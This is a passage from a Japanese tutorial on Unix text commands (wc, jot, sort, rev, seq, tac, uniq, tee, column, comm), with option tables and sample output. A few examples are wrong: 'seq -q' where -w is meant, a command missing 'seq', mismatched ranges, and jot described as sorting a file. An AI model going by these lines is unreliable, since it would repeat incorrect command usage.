</tr>
</thead>
<tbody>
<tr>
<td>-c</td>
<td>バイト数を表示する</td>
</tr>
<tr>
<td>-m</td>
<td>文字数を表示する（マルチバイト文字に対応）</td>
</tr>
<tr>
<td>-l</td>
<td>改行の数を表示する</td>
</tr>
<tr>
<td>-w</td>
<td>単語数を表示する</td>
</tr>
</tbody>
</table>
<h3 id=wcコマンド詳細説明>wcコマンド詳細説明</h3>
<h3 id=行数と単語数とバイト数を数える>行数と単語数とバイト数を数える</h3>
<p>　「wc テキストファイル名」で、指定したテキストファイルの行数、単語数、バイト数が表示されます。複数のファイルを指定（ワイルドカード「*」も使用可）した場合は、各ファイルの結果と合計が表示されます。</p>
<p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>bash-5.1$ wc index.md
     158     211    7239 index.md
bash-5.1$
</code></pre><p>表示される値は左から<br>
ファイルの行数 単語数 バイト数となります。</p>
<h3 id=文字数を数える>文字数を数える</h3>
<p>　バイト数ではなく、文字数を数えたい場合は「-m」オプションを使用します。</p>
<p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>$ wc -m filename.txt
</code></pre><h3 id=行数だけを表示する>行数だけを表示する</h3>
<p>　行数だけをカウントしたい場合は、「-l」オプションを使用します。</p>
<p>　例えば、「find」コマンドは見つけたファイルを「1件1行」で出力するので、行数を数えることでファイルの個数を知ることができます。</p>
<p>ls -la コマンドでファイルの数を調べる</p>
<pre tabindex=0><code>bash-5.1$ ls -la | grep -v ^d | wc -l
       9
bash-5.1$
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>grep -v ^d でディレクトリを除外しています。</dd>
</dl>
</div>
<p>ファイルの行数を調べる</p>
<pre tabindex=0><code>$ cat filename.txt | wc -l
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>wc -m wc -l この２つは必須です。</dd>
</dl>
</div>
<h2 id=jotコマンド>jotコマンド</h2>
<ul>
<li>連番を生成する</li>
<li>文字列と組み合わせた連番を作成する</li>
<li>printf のフォーマットで出力する</li>
<li>連番の範囲を指定して出力する</li>
<li>乱数を出力する</li>
</ul>
<h3 id=jotコマンド概要>jotコマンド概要</h3>
<p>jotコマンドは、連番数字はもちろん、連番付きのアルファベットを生成したり、ランダムな数字を生成したりできます。似たコマンドに <code>seq</code>や<code>$RANDOM</code> コマンドがあります。</p>
<h3 id=jotコマンドの書式>jotコマンドの書式</h3>
<p>jot [オプション]</p>
<h3 id=jotコマンドの主なオプション>jotコマンドの主なオプション</h3>
<table>
<thead>
<tr>
<th>オプション</th>
<th>意味</th>
</tr>
</thead>
<tbody>
<tr>
<td>-w [文字列]</td>
<td>文字列を指定する</td>
</tr>
<tr>
<td>-r</td>
<td>乱数を出力する</td>
</tr>
</tbody>
</table>
<h3 id=jotコマンド詳細説明>jotコマンド詳細説明</h3>
<h3 id=連番を作る>連番を作る</h3>
<p>「jot ファイル名」で、ファイルの中身を並べ替えます。</p>
<p>さっそく連番を出力してみます。<br>
まずは10個の連番を出力します。</p>
<pre tabindex=0><code>$ jot 10 
1
2
3
4
5
6
7
8
9
10
</code></pre><p>seqコマンドではこうなります</p>
<pre tabindex=0><code>$ seq 10
1
2
3
4
5
6
7
8
9
10
</code></pre><h3 id=文字列と組み合わせた連番を作成する>文字列と組み合わせた連番を作成する</h3>
<p>文字列 abc に続けて10個の連番を作成します。</p>
<pre tabindex=0><code>$ jot -w abc 10
abc1
abc2
abc3
abc4
abc5
abc6
abc7
abc8
abc9
abc10
</code></pre><p>次の項でも説明しますが、seqコマンドでも同様のことができます。</p>
<pre tabindex=0><code>$ seq -f &quot;%04g&quot; 3
0001
0002
0003
</code></pre><p>seqコマンドでもprintfフォーマットで出力できますので、文字列と連結した連番の生成もできます。</p>
<pre tabindex=0><code>$ seq -f &quot;IMG%04g.jpg&quot; 3
IMG0001.jpg
IMG0002.jpg
IMG0003.jpg
</code></pre><p>では、次の項では<code>jot</code>コマンドで<code>printf</code>のフォーマットで出力する方法を具体的に説明します。</p>
<h3 id=printf-のフォーマットで出力する>printf のフォーマットで出力する</h3>
<pre tabindex=0><code>$ jot -w 'name%03d' 10
name001
name002
name003
name004
name005
name006
name007
name008
name009
name010
</code></pre><h3 id=連番の範囲を指定して出力する>連番の範囲を指定して出力する</h3>
<p>5からの連番を３つ出力します。</p>
<pre tabindex=0><code>$ jot   -w 'name%03d' 3 5
name005
name006
name007
</code></pre><p>10からの連番を５つ出力します。</p>
<pre tabindex=0><code>$ jot -w 'name%03d' 5 10
name010
name011
name012
name013
name014
bash-5.1$
</code></pre><h3 id=乱数を出力する>乱数を出力する</h3>
<p>1から10までの乱数を５つ出力します。<br>
-r 5 は乱数を５つ出力することを示します。<br>
1 10 は、１から１０までの範囲でといういみとなります。</p>
<p>1から100までの範囲で乱数を５つ出力すると以下の通りになります。</p>
<pre tabindex=0><code>jot -r 5 1 100
1
6
17
91
46
</code></pre><p>print文フォーマットで、1から100までの範囲で乱数を５つ出力してみます。</p>
<pre tabindex=0><code>$ jot -w 'name%03d' -r 5 1 10
name008
name006
name007
name001
name006
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>連番を作成する場合は<code>seq</code>、乱数を扱う場合は <code>$RANDOM</code>を使う場合が多いと思いますが、jotコマンドは、<code>seq</code>,<code>$RANDOM</code>を足し合わせて、同等それ以上の実行が可能です。</dd>
</dl>
</div>
<h2 id=sortコマンド>sortコマンド</h2>
<ul>
<li>テキストファイルを並べ替える</li>
<li>数値の大小で並べ替える</li>
<li>列を指定して並べ替える</li>
<li>CSVデータを並べ替える</li>
</ul>
<h3 id=sortコマンド概要>sortコマンド概要</h3>
<p><code>sort</code>は、テキストファイルを「行単位で並べ替える」コマンドです。他のコマンドの実行結果を並べ替える場合にも使用できます。また、空白やカンマ区切りのデータに対し、並べ替えに使用する列を指定することも可能です。</p>
<h3 id=sortコマンドの書式>sortコマンドの書式</h3>
<p>sort [オプション] [ファイル……]</p>
<h3 id=sortコマンドの主なオプション>sortコマンドの主なオプション</h3>
<table>
<thead>
<tr>
<th>オプション</th>
<th>意味</th>
</tr>
</thead>
<tbody>
<tr>
<td>-r</td>
<td>逆順で並べ替える</td>
</tr>
<tr>
<td>-n</td>
<td>文字列を数値と見なして並べ替える</td>
</tr>
<tr>
<td>-u</td>
<td>同一行は1つ目だけを出力する</td>
</tr>
<tr>
<td>-k 指定</td>
<td>場所と並べ替え種別を指定する（「-k 2」なら2列目、「-k 2n」なら2列目を数値として並べ替える。複数指定する場合は「-k」オプションを複数回指定する）</td>
</tr>
</tbody>
</table>
<h3 id=sortコマンド詳細説明>sortコマンド詳細説明</h3>
<h3 id=テキストファイルを並べ替える>テキストファイルを並べ替える</h3>
<p>「sort ファイル名」で、ファイルを並べ替えます。逆順で並べ替えたい場合は「sort -r ファイル名」とします。</p>
<p>以下のファイルを並べ替えてみます。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:baz.txt data-lang=:baz.txt>A
B
A
B
C
</code></pre></div><p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>$ cat baz.txt | sort
A
A
B
B
C
</code></pre><p>逆順にソートするには -r オプションを付けます。</p>
<pre tabindex=0><code>$ cat baz.txt | sort -r
C
B
B
A
A
</code></pre><h3 id=数値の大小で並べ替える>数値の大小で並べ替える</h3>
<p>　sortコマンドのデフォルトでは、数字も文字と同じように並べ替えられます。例えば、「1」と「11」と「100」では、「1」→「100」→「11」の順番になります。これを数値として「1」→「11」→「100」の順で並べ替えるには、「-n」オプションを使用します。</p>
<p><code>seq</code>コマンドで１から１０までを出力します。</p>
<pre tabindex=0><code>$ seq 10
1
2
3
4
5
6
7
8
9
10
</code></pre><p>では普通に並べ替えてみます。</p>
<pre tabindex=0><code>$ seq 10 | sort
1
10
2
3
4
5
6
7
8
9
</code></pre><p>1の次に10が来てしまいました。文字を扱う並べ方でソートをしているからです。数値は数値を扱うことをsortコマンドに教えて上げる必要があります。 -n コマンドをつけます。n は numberのことです。</p>
<pre tabindex=0><code>$ seq 10 | sort -n
1
2
3
4
5
6
7
8
9
10
</code></pre><h3 id=列を指定して並べ替える>列を指定して並べ替える</h3>
<p>　「-k」オプションを使うと、並べ替えに使用する「列」を指定できます。例えば、duコマンドの結果の2番目の列、つまり「ディレクトリ名」で並べ替えるには、「du -s * | sort -k 2」のように指定します。さらに、2番目の列で逆順に並べ替えるならば、「du -s * | sort -k 2r」と指定します。</p>
<p>まずは以下のファイルを作成します。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:du.txt data-lang=:du.txt>2912	Applications
1519968	Calibre Library
24631656	Desktop
10141664	Documents
24	Downloads
872	Dropbox
0	Favorite
</code></pre></div><p>まずは最初のフィルド（ファイルサイズ）で並べ替えてみます。</p>
<pre tabindex=0><code>$ cat du.txt | sort
0	Favorite
10141664	Documents
1519968	Calibre Library
24	Downloads
24631656	Desktop
2912	Applications
872	Dropbox
</code></pre><p>-n オプションを付けるのを忘れてしまいました。<br>
次は -n オプションをつけて実行します。</p>
<pre tabindex=0><code>$ cat du.txt | sort -n
0	Favorite
24	Downloads
872	Dropbox
2912	Applications
1519968	Calibre Library
10141664	Documents
24631656	Desktop
</code></pre><p>次は、２番目の列（ディレクトリ名）で並べ替えを行います。</p>
<pre tabindex=0><code>$ cat du.txt | sort -k2
2912	Applications
1519968	Calibre Library
24631656	Desktop
10141664	Documents
24	Downloads
872	Dropbox
0	Favorite
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>sortコマンドはものすごく良く使います。たくさんのオプションがありますが、まずはここで紹介したオプションを覚えればほぼ問題はありません。必要になったらGoogleで検索してください。</dd>
</dl>
</div>
<h3 id=csvデータを並べ替える>CSVデータを並べ替える</h3>
<p>　「-k」オプションでは、空白文字を区切りとして、並べ替えに使う列を指定することができます。区切り文字を変更したい場合は、「-t」オプションで使用する文字を指定します。</p>
<p>　例えば、CSV（comma-separated values）データの場合、区切り文字は「,（カンマ）」なので「-t ,」または「-t &ldquo;,"」のように指定します。</p>
<p>　なお、3番目の列の値を数値として並べ替える場合は「-k 3n」、数値としてさらに逆順で並べ替えるなら「-k 3nr」のように指定します。</p>
<p>列は以下のとおりです。<br>
連番,氏名,氏名（カタカナ）,性別,年齢,取得ポイント</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:data.txt data-lang=:data.txt>$ cat test.csv
1,小出里歩,オデリホ,女,27,85
2,吉野里紗,ヨシノリサ,女,38,894
3,本郷末治,ホンゴウスエジ,男,56,252
4,谷村千代乃,タニムラチヨノ,女,44,556
5,内野響子,ウチノキョウコ,女,44,170
6,塩谷貢,シオタニミツグ,男,34,494
7,児島愛子,コジマアイコ,女,39,675
8,白木俊史,シラキトシフミ,男,57,245
9,飯塚遥佳,イイヅカハルカ,女,20,974
10,阿久津清蔵,アクツセイゾウ,男,9,120
</code></pre></div><p>sortコマンドでCSVデータを扱う場合は -t オプションを使います。<br>
カンマ区切りの場合は -t, となります。</p>
<p>年齢で並べ替えてみます。</p>
<pre tabindex=0><code>$ cat data.txt | sort -t, -nr -k5
8,白木俊史,シラキトシフミ,男,57,245
3,本郷末治,ホンゴウスエジ,男,56,252
5,内野響子,ウチノキョウコ,女,44,170
4,谷村千代乃,タニムラチヨノ,女,44,556
7,児島愛子,コジマアイコ,女,39,675
2,吉野里紗,ヨシノリサ,女,38,894
6,塩谷貢,シオタニミツグ,男,34,494
1,小出里歩,オデリホ,女,27,85
9,飯塚遥佳,イイヅカハルカ,女,20,974
10,阿久津清蔵,アクツセイゾウ,男,9,120
</code></pre><p>sort -t, -nr -k5<br>
-t, は、CSVデータの区切り文字をカンマ（,）とする<br>
-nr の、nは並べ替えのデータを数値として扱う<br>
の、rは逆順で出力する<br>
-k5 は、並べ替えのキーとなる列を５列目とする</p>
<p>という意味です。<br>
では、６列目の取得ポイントの多く順に並べ替えてみます。</p>
<pre tabindex=0><code>bash-5.1$ cat data.txt | sort -t, -nr -k6
9,飯塚遥佳,イイヅカハルカ,女,20,974
2,吉野里紗,ヨシノリサ,女,38,894
7,児島愛子,コジマアイコ,女,39,675
4,谷村千代乃,タニムラチヨノ,女,44,556
6,塩谷貢,シオタニミツグ,男,34,494
3,本郷末治,ホンゴウスエジ,男,56,252
8,白木俊史,シラキトシフミ,男,57,245
5,内野響子,ウチノキョウコ,女,44,170
10,阿久津清蔵,アクツセイゾウ,男,9,120
1,小出里歩,オデリホ,女,27,85
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>csvデータのカンマ区切りは見にくいですね。</dd>
<dd>工夫してタブ区切りに変換して出力してみてください。</dd>
</dl>
</div>
<pre tabindex=0><code>$ cat data.txt | sort -t, -nr -k6 | tr &quot;,&quot; &quot;\t&quot;
9	飯塚遥佳	イイヅカハルカ	女	20	974
2	吉野里紗	ヨシノリサ	女	38	894
7	児島愛子	コジマアイコ	女	39	675
4	谷村千代乃	タニムラチヨノ	女	44	556
6	塩谷貢	シオタニミツグ	男	34	494
3	本郷末治	ホンゴウスエジ	男	56	252
8	白木俊史	シラキトシフミ	男	57	245
5	内野響子	ウチノキョウコ	女	44	170
10	阿久津清蔵	アクツセイゾウ	男	9	120
1	小出里歩	オデリホ	女	27	85
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>ちょっと見やすくなりました（^^;</dd>
</dl>
</div>
<h2 id=revコマンド>revコマンド</h2>
<ul>
<li>ファイルの各行を反転させる</li>
<li>キーボードから入力した内容を反転させる</li>
</ul>
<h3 id=revコマンド概要>revコマンド概要</h3>
<p>reverseの語源を持つ「rev」は、ファイルの各行を末尾から行頭に向かって文字列を反転させ出力します。</p>
<h3 id=revコマンドの書式>revコマンドの書式</h3>
<p>rev ファイル名</p>
<h3 id=revコマンドの主なオプション>revコマンドの主なオプション</h3>
<table>
<thead>
<tr>
<th>オプション</th>
<th>意味</th>
</tr>
</thead>
</table>
<p>オプションはありません。</p>
<h3 id=revコマンド詳細説明>revコマンド詳細説明</h3>
<h3 id=ファイルの各行を反転させる>ファイルの各行を反転させる</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:data.txt data-lang=:data.txt>$ cat data.txt
1,小出里歩,オデリホ,女,27,85
2,吉野里紗,ヨシノリサ,女,38,894
3,本郷末治,ホンゴウスエジ,男,56,252
4,谷村千代乃,タニムラチヨノ,女,44,556
5,内野響子,ウチノキョウコ,女,44,170
6,塩谷貢,シオタニミツグ,男,34,494
7,児島愛子,コジマアイコ,女,39,675
8,白木俊史,シラキトシフミ,男,57,245
9,飯塚遥佳,イイヅカハルカ,女,20,974
10,阿久津清蔵,アクツセイゾウ,男,9,120
</code></pre></div><p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>$ cat data.txt | rev
58,72,女,ホリデオ,歩里出小,1
498,83,女,サリノシヨ,紗里野吉,2
252,65,男,ジエスウゴンホ,治末郷本,3
655,44,女,ノヨチラムニタ,乃代千村谷,4
071,44,女,コウョキノチウ,子響野内,5
494,43,男,グツミニタオシ,貢谷塩,6
576,93,女,コイアマジコ,子愛島児,7
542,75,男,ミフシトキラシ,史俊木白,8
479,02,女,カルハカヅイイ,佳遥塚飯,9
021,9,男,ウゾイセツクア,蔵清津久阿,01
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>どんなときに使うのでしょうね。むしろ、どう使うのかというよりも、必要になったときに思い出すと激しく便利、といったトリッキーなコマンドのようです。<code>tac</code>と<code>rev</code>はセットで覚えておきましょう。</dd>
</dl>
</div>
<h2 id=seqコマンド>seqコマンド</h2>
<ul>
<li>連続番号を出力する</li>
<li>開始の数と間隔を指定する</li>
<li>数字を逆順で出力する</li>
<li>書式を指定して出力する</li>
</ul>
<h3 id=seqコマンド概要>seqコマンド概要</h3>
<p><code>sequence</code>の語源を持つ「seq」は連続番号の他、一定間隔置きに数字の列を出力する順列番号出力コマンドです。</p>
<h3 id=seqコマンドの書式>seqコマンドの書式</h3>
<p>seq [オプション] [開始の数 [増分]] 終了の数</p>
<h3 id=seqコマンドの主なオプション>seqコマンドの主なオプション</h3>
<table>
<thead>
<tr>
<th>オプション</th>
<th>意味</th>
</tr>
</thead>
<tbody>
<tr>
<td>-w</td>
<td>先頭を0で埋めて、数字の幅を等しくする</td>
</tr>
<tr>
<td>-f 書式</td>
<td>数字の書式を指定する</td>
</tr>
<tr>
<td>-s 文字列</td>
<td>数字の区切りに使う文字列を指定する</td>
</tr>
</tbody>
</table>
<h3 id=seqコマンド詳細説明>seqコマンド詳細説明</h3>
<h3 id=連続番号を出力する>連続番号を出力する</h3>
<p>　一般的な<code>seq</code>コマンドの利用例として、 <code>seq 10</code>は、1から10までを出力します。</p>
<p>１から指定した数までの連続番号を出力する</p>
<pre tabindex=0><code>$ seq 10
1
2
3
4
5
6
7
8
9
10
</code></pre><p>出力される数字の桁を併せたい場合はよくあります。<br>
例えば、二桁で表示させたい場合に、2ではなく02、3ではなく03といった出力です。</p>
<p>この場合は「-w」オプションを使用して桁を揃えることができます。例えば <code>seq -w 10</code> の場合、幅が最大なのは「10」ですから、01、02と2桁で出力されます。</p>
<p>先頭を0で埋めて桁数をそろえて出力する</p>
<pre tabindex=0><code>$ seq -q 10
01
02
03
04
05
06
07
08
09
10
</code></pre><h3 id=開始の数と間隔を指定する>開始の数と間隔を指定する</h3>
<p>　開始の数を指定する場合は <code>seq 5 15</code> のように、「seq 開始の数 終了の数」と指定します。</p>
<p>seq 5 （1から5までの数を出力する）</p>
<pre tabindex=0><code>$ seq 5
1
2
3
4
5
</code></pre><p>　開始位置を指定することもできます。たとえば以下のように、5から始まり15までの順列を出力したい場合は以下のとおりです。</p>
<p>seq 5 15 （5から15までの数を出力する）</p>
<pre tabindex=0><code>$ 5 15
5
6
7
8
9
10
11
12
13
14
15
</code></pre><p><code>seq 5 2 15</code> のように、開始と終了の間に増分を指定することもできます。</p>
<p>seq 5 2 15 （5から15まで、数を2ずつ増やしながら出力する）</p>
<pre tabindex=0><code>$ seq 5 2 10
5
7
9
</code></pre><h3 id=数字を逆順で出力する>数字を逆順で出力する</h3>
<p>　増分には実数や負の数を指定できます。従って、増分を「-1」と指定することで、数を逆順に出力することが可能です。この場合、開始と終了の数を指定する必要がある点に注意してください。</p>
<p>seq 5 -1 1 （5から1までの数を出力する）</p>
<pre tabindex=0><code>$ seq 5 -1 1
5
4
3
2
1
</code></pre><p>　増分を「-1」と指定した場合と同じ効果を、別のコマンドを用いて実現できます。入力を行単位で逆順に出力する「tac」コマンドです。</p>
<p>seq 5 | tac （seqで1から5を出力し、tacコマンドで逆順に並び替えている）</p>
<pre tabindex=0><code>$ seq 5 | tac
5
4
3
2
1
</code></pre><h3 id=書式を指定して出力する>書式を指定して出力する</h3>
<p>　「-f」オプションを用いて数字の書式を指定することができます。</p>
<p>　「%g」を利用することで、整数で出力する際の桁数を指定できます。例えば、4桁の幅であれば「%4g」、4桁で「0001」のようにゼロで埋めるならば「%04g」のようにします。</p>
<p>seq -f 書式 3 （1から3までの数値を指定した書式で出力する）</p>
<pre tabindex=0><code>$ seq -f &quot;%04g&quot; 3
0001
0002
0003


$ seq -f &quot;IMG%04g.jpg&quot; 3
IMG0001.jpg
IMG0002.jpg
IMG0003.jpg
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>次はtacコマンドについて説明します。</dd>
</dl>
</div>
<h2 id=tacコマンド>tacコマンド</h2>
<ul>
<li>ファイルを最終行から逆順に出力する</li>
</ul>
<h3 id=tacコマンド概要>tacコマンド概要</h3>
<p><code>cat</code>コマンドを逆から読んだ「tac」はファイルの最終行から、行単位に逆順に出力するコマンドです。知る人ぞ知るマニア向けコマンドの一つです。</p>
<h3 id=tacコマンドの書式>tacコマンドの書式</h3>
<p>tac [オプション] ファイル名</p>
<h3 id=tacコマンドの主なオプション>tacコマンドの主なオプション</h3>
<table>
<thead>
<tr>
<th>オプション</th>
<th>意味</th>
</tr>
</thead>
</table>
<p>特筆するべきオプションはありません。</p>
<h3 id=tacコマンド詳細説明>tacコマンド詳細説明</h3>
<h3 id=ファイルを最終行から逆順に出力する>ファイルを最終行から逆順に出力する</h3>
<p>「tac ファイル名」で、指定したファイルを最終行から逆順に出力します</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:data.txt data-lang=:data.txt>$ cat data.txt
1,小出里歩,オデリホ,女,27,85
2,吉野里紗,ヨシノリサ,女,38,894
3,本郷末治,ホンゴウスエジ,男,56,252
4,谷村千代乃,タニムラチヨノ,女,44,556
5,内野響子,ウチノキョウコ,女,44,170
6,塩谷貢,シオタニミツグ,男,34,494
7,児島愛子,コジマアイコ,女,39,675
8,白木俊史,シラキトシフミ,男,57,245
9,飯塚遥佳,イイヅカハルカ,女,20,974
10,阿久津清蔵,アクツセイゾウ,男,9,120
</code></pre></div><p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>$ cat data.txt | tac
10,阿久津清蔵,アクツセイゾウ,男,9,120
9,飯塚遥佳,イイヅカハルカ,女,20,974
8,白木俊史,シラキトシフミ,男,57,245
7,児島愛子,コジマアイコ,女,39,675
6,塩谷貢,シオタニミツグ,男,34,494
5,内野響子,ウチノキョウコ,女,44,170
4,谷村千代乃,タニムラチヨノ,女,44,556
3,本郷末治,ホンゴウスエジ,男,56,252
2,吉野里紗,ヨシノリサ,女,38,894
1,小出里歩,オデリホ,女,27,85
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd><code>cat</code>の反転が<code>tac</code>。よく考えたものです。恐れ入りました。</dd>
<dd>次はrevコマンドについて説明します。</dd>
</dl>
</div>
<h2 id=uniqコマンド>uniqコマンド</h2>
<ul>
<li>重複している行を削除する</li>
<li>大文字／小文字を区別しないで重複行を削除する</li>
<li>重複している行をカウントする</li>
</ul>
<h3 id=uniqコマンド概要>uniqコマンド概要</h3>
<p><code>uniq</code>コマンドは、ファイル内の重複している行を扱うコマンドです。具体的には重複している行を除去して表示したり、重複回数を表示したりできます。</p>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd><code>uniq</code>コマンドを実行する前に<code>sort</code>コマンドで並べ替えておく必要があります。</dd>
</dl>
</div>
<h3 id=uniqコマンドの書式>uniqコマンドの書式</h3>
<p>uniq [オプション] 入力ファイル [出力ファイル]</p>
<h3 id=uniqコマンドの主なオプション>uniqコマンドの主なオプション</h3>
<table>
<thead>
<tr>
<th>オプション</th>
<th>意味</th>
</tr>
</thead>
<tbody>
<tr>
<td>-i</td>
<td>比較時に大文字と小文字の違いを無視する</td>
</tr>
<tr>
<td>-c</td>
<td>各行の前に出現回数を出力する</td>
</tr>
</tbody>
</table>
<h3 id=uniqコマンド詳細説明>uniqコマンド詳細説明</h3>
<h3 id=重複している行を削除する>重複している行を削除する</h3>
<p>$ <code>uniq</code> ファイル名 で、ファイル内の重複行を取り除くことができます。注意点はあらかじめ<code>sort</code>コマンドで並べ替えておく必要があります。</p>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>実は <code>sort -u</code> というコマンドは、並べ替えつつuniqも実行するという便利な<code>sort</code>コマンドのオプションもあります。一般的には<code>sort -u</code>を使うことが多いのですが、明示的にuniqコマンドを使うこともあります。</dd>
</dl>
</div>
<p>以下のコマンドの出力は同じです。</p>
<pre tabindex=0><code>$ cat fileName.txt | sort | uniq
$ cat fileName.txt | sort -u
</code></pre><h3 id=大文字小文字を区別しないで重複行を削除する>大文字／小文字を区別しないで重複行を削除する</h3>
<p>「-i」（&ndash;ignore-case）オプションを使うと、大文字／小文字を区別しないで重複する行を削除することができます。</p>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd><code>uniq</code>コマンドのignore-caseは-iです。同時に予め実行しておくsortコマンドもignore-caseも行う必要がありますが、こちらのオプションは -f です。紛らわしいですね。</dd>
</dl>
</div>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>各コマンドのignore-case(大文字小文字を区別しない)は、以下のとおりです。</dd>
<dd>sort -f</dd>
<dd>uniq -i</dd>
<dd>grep -i</dd>
</dl>
</div>
<p>実行結果は以下のとおりです。</p>
<pre tabindex=0><code>$ cat fileName.txt | sort -f | uniq -i
</code></pre><h3 id=重複している行をカウントする>重複している行をカウントする</h3>
<p><code>sort</code>と<code>uniq</code>コマンドの組み合わせで、最も使われるオプションは-cでしょう。「-c」オプションは、重複している行をカウントします。</p>
<p>アクセスログを並べ替えて表示</p>
<pre tabindex=0><code>cat /var/log/httpd/access.log | sort | uniq -c | sort -n | head -n15
</code></pre><p>最初の<code>cat</code>でApacheのaccess.logを出力します。<br>
次の<code>sort</code>で出力を並べ替えます。<br>
そして<code>uniq -c</code>で、重複行の数をカウントし、行頭に頻度数を付与します。<br>
さらに、行頭の頻度数を数値として扱い<code>sort -n</code>で並べ替えます。<br>
最後の<code>head -n15</code>コマンドで、頻度の高いアクセスを出力します。</p>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>CSSなどのファイルを除外する場合は以下のコマンドを使うと良いでしょう。</dd>
</dl>
</div>
<pre tabindex=0><code>cat /var/log/httpd/access.log | grep -ive &quot;GET /.*\.\(css\|js\|jpg\|gif\|png\|swf\|ico\)\ HTTP&quot; | sort | uniq -c | sort -n | head -n15
</code></pre><h2 id=teeコマンド>teeコマンド</h2>
<ul>
<li>ファイルへのリダイレクトとパイプを同時に行う</li>
<li>出力するファイルは都度新規作成ではなく追記する</li>
</ul>
<h3 id=teeコマンド概要>teeコマンド概要</h3>
<p><code>tee</code>コマンドは、標準入力から受け取った出力を、標準出力へ出力しつつ、同時にファイルに書き出すコマンドです。</p>
<h3 id=teeコマンドの書式>teeコマンドの書式</h3>
<p>コマンド | tee ファイル | コマンド2<br>
コマンド | tee ファイル1 ファイル2 ファイル3……</p>
<h3 id=teeコマンドの主なオプション>teeコマンドの主なオプション</h3>
<table>
<thead>
<tr>
<th>オプション</th>
<th>意味</th>
</tr>
</thead>
<tbody>
<tr>
<td>-a</td>
<td>指定したファイルが既に存在する場合、新規にファイルを作成せずにすでに存在するファイルに追加する（リダイレクトの「&#187;」に相当）</td>
</tr>
</tbody>
</table>
<h3 id=teeコマンド詳細説明>teeコマンド詳細説明</h3>
<h3 id=ファイルへのリダイレクトとパイプを同時に行う>ファイルへのリダイレクトとパイプを同時に行う</h3>
<p>以下のコマンドは、画面に出力をしつつ、同じ内容を output.txtに出力しています。</p>
<pre tabindex=0><code>$ cat /var/log/httpd/access.log | sort | uniq -c | sort -n | head -n15 | tee output.txt
</code></pre><h3 id=出力するファイルは都度新規作成ではなく追記する>出力するファイルは都度新規作成ではなく追記する</h3>
<p><code>tee</code>コマンドは指定されたファイルを新規作成して出力内容をファイルに書き出します。-a オプションを付けることによって、append（追記）することができます。</p>
<p>output.txtに出力を追記する</p>
<pre tabindex=0><code># 予めファイルを生成しておく
$ :&gt;output.txt
$ cat /var/log/httpd/access.log | sort | uniq -c | sort -n | head -n15 | tee -a output.txt
# 時間をおいて再度実行すると追記される
$ cat /var/log/httpd/access.log | sort | uniq -c | sort -n | head -n15 | tee -a output.txt
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd><code>tee</code>コマンドの -aオプションは非常によく使います。</dd>
<dd>teeコマンドの出力をファイル書き出す場合、デフォルトは「>」と同等の処理で、-aオプションを付けることによって「&#187;」と同様に処理となります。</dd>
</dl>
</div>
<div class="tips-area alert">
<dl>
<dt>注意</dt>
<dd>「&#187;」も同様に <code>tee -a</code>の場合は、予めファイルを作成しておき、そのファイルに対して「&#187;」や<code>tee -a</code>を行います。追記する最初の処理段階でファイルが存在していることを明示的に書いておくことが重要です。</dd>
<dd>以下のまとめのように、追記する前に上書きする処理をしておく場合は、あらかじめファイルの生成をする必要はありませんが、明示的に「 $ :> filename 」のようにファイルを生成しておくと、ソースがわかりやすくなります。</dd>
</dl>
</div>
<p>まとめ<br>
<code>echo</code>だと以下のとおりです。ファイルには出力されるが、画面には処理内容が出力されないのでいまいち不便。</p>
<pre tabindex=0><code># 上書き
$ echo &quot;文字列&quot; &gt; fileName
# 追記
$ echo &quot;文字列&quot; &gt;&gt; fileName
</code></pre><p>そこで、処理の出力内容が画面にも表示されるよう<code>tee</code>を使う</p>
<pre tabindex=0><code># 上書き
$ echo &quot;文字列&quot; | tee fileName
# 追記
$ echo &quot;文字列&quot; | tee -a fileName
</code></pre><h2 id=columnコマンド>columnコマンド</h2>
<p>「column」はテキストを、複数の列（column）に整形するコマンドです。</p>
<h3 id=区切り文字を指定して表形式で表示する>区切り文字を指定して表形式で表示する</h3>
<p>普通のカンマ区切りのcsvファイル</p>
<pre tabindex=0><code>$ cat hoge.csv
bar00,bar01,bar02,bar03,bar04
bar05,bar06,bar07,bar08,bar09
</code></pre><p>上記csvファイルを、<code>column</code>コマンドで見やすくします。<br>
オプション -s で区切り文字をカンマ(,)に指定し、<br>
オプション -t を利用し区切り文字(,)をTABに置き換えます。</p>
<pre tabindex=0><code>$ column -t -s, hoge.csv
bar00  bar01  bar02  bar03  bar04
bar05  bar06  bar07  bar08  bar09
</code></pre><h2 id=commコマンド>commコマンド</h2>
<p><code>comm</code>コマンドは、テキストファイルを比較するコマンドです。<br>
<code>comm ファイル1 ファイル2</code> で2つのテキストファイルを比較し、ファイル1だけにある行、ファイル2だけにある行、共通している行を出力します。<br>
比較するファイルはソートされている必要があります。</p>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>比較するファイルはソートされている必要があるんです！</dd>
</dl>
</div>
<h3 id=使い方>使い方</h3>
<p>まずは１つ目のファイル</p>
<pre tabindex=0><code>$ cat words.txt
Apple
Banana
Orange
India
US
Canada
